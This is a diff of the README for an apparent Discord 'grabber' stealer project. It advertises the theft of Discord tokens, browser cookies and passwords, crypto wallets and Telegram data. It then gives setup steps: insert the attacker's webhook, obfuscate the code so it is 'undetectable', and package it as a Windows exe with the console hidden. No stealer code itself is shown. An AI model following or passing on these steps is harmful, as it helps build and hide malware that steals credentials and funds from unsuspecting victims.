@@ -11,17 +11,17 @@ https://github.com/us0y
 
 Startup
 
-Grab Discord Token, Phone Number, E-mail and HQ Friends.
+• Grab Discord Token, Phone Number, E-mail and HQ Friends.
 
-Discord Injection
+• Discord Injection
 
-Grab Browser cookies & passwords
+• Grab Browser cookies & passwords
 
-Grab specials files
+• Grab specials files
 
-Grab Crypto Wallets, Metamask, Atomic, Exodus
+• Grab Crypto Wallets, Metamask, Atomic, Exodus
 
-Grab Telegram
+• Grab Telegram
 
                                                 🖼️ Pictures
 
@@ -31,23 +31,23 @@ Grab Telegram
                                                 
                                                 ⬇️ Setup (Manual)
                                                   
-First paste and save your webhook address instead of `"SET YOUR WEBHOOK"` in Creal.py
+• First paste and save your webhook address instead of `"SET YOUR WEBHOOK"` in Creal.py
 
-If you use obfuscator it will be undetectable.
+• If you use obfuscator it will be undetectable.
 
-if you have an error while installing try `pip install -r requirements.txt`
+• if you have an error while installing try `pip install -r requirements.txt`
 
-Now You need to use pyinstaller to convert python file to exe.
+• Now You need to use pyinstaller to convert python file to exe.
 
-Open CMD and type `pip install auto_py_to_exe`
+• Open CMD and type `pip install auto_py_to_exe`
 
-And after installed `python -m auto_py_to_exe`
+• And after installed `python -m auto_py_to_exe`
 
-Browse file Select `One file and Windows Based (hide the console)`
+• Browse file Select `One file and Windows Based (hide the console)`
 
 ![pyy](https://github.com/us0y/Splint-Grabber/assets/130321653/c3012514-acf5-4b1d-81aa-3462bcf0c922)
 
-And press `convert .py to .exe`
+• And press `convert .py to .exe`
 
 
 
